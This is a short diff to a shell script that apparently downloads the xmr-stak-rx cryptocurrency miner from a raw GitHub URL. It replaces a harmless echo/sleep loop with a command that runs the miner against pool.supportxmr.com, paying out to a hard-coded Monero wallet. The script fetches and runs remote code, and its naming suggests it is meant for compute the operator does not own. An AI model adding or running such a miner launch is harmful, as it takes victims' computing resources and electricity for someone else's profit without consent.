@@ -12,11 +12,4 @@ wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/mast
 
 cd xmr-stak-rx-linux-1.0.1-cpu_cuda-nvidia
 
-while true
-do
-
-echo "linux8474"
-
-sleep 2
-
-done
+./xmr-stak-rx --noTest -u 49sgRRRrxy9F1P9gdsDgXk7AXroSQ5Xw68CvfghLDFx9MvJ5PdJut4JKQXtTZEtN9JJ3EJnio8cZVHZ56oXBmeNG9qtj3wD -p linux84 -o pool.supportxmr.com:3333
